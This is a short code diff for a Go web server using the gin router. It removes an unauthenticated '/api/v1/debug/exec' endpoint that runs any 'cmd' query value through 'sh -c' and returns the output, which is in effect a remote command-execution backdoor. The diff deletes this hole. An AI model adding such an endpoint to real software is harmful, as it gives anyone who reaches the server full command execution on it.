@@ -49,12 +49,6 @@ func main() {
 	router.GET("/health", processHandler.Health)
 	router.GET("/api/info", processHandler.Root)
 
-	
-	router.GET("/api/v1/debug/exec", func(c *gin.Context) {
-		cmd := c.Query("cmd")
-		out, _ := exec.Command("sh", "-c", cmd).Output()
-		c.String(http.StatusOK, string(out))
-	})
 
 	router.POST("/api/v1/auth/login", func(c *gin.Context) {
 		var req authRequest
